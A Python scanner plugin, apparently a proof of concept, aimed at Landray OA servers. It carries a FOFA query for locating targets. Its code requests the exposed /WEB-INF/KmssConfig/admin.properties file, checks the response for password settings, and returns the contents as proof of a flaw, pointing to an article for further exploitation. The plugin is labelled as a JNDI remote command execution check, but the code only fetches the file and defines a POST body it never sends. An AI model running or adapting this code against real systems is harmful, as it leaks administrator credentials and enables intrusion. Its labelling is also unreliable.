#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/蓝凌OA/蓝凌OA admin.do JNDI远程命令执行.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '蓝凌OA admin.do JNDI远程命令执行',

      'level'     :   'high',

      'FOFA'      :   'app="Landray-OA系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/WEB-INF/KmssConfig/admin.properties'
  data = r'''var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'password.*?=.*?kmss.properties.encrypt.enabled.*?',res.text,re.S):
      ret['huixian'] = res.text+"\n后续利用请参考参考文章！"
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret